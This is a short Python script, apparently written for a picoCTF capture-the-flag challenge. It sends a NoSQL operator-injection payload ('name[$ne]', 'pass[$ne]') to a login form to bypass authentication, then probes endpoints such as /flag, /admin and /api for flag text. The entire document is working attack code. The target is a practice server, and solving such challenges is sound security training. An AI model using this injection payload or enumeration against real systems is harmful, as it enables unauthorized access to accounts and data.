import requests, time
base = 'http://wily-courier.picoctf.net:49463'
s = requests.Session()
# NoSQL injection to bypass auth
r = s.post(base, data={'name[$ne]': '', 'pass[$ne]': ''})
print('Injection response length:', len(r.text))
print('Cookies:', s.cookies.get_dict())
# Probe potential endpoints
for path in ['/flag', '/home', '/dashboard', '/admin', '/secret', '/api', '/user', '/profile', '/data', '/app.js', '/static/', '/robots.txt', '/sitemap.xml']:
    r2 = s.get(base + path)
    print(path, r2.status_code, len(r2.text))
    if r2.status_code == 200 and len(r2.text) > 100:
        if 'picoCTF' in r2.text or 'flag' in r2.text.lower():
            print('POSSIBLE FLAG:', r2.text[:500])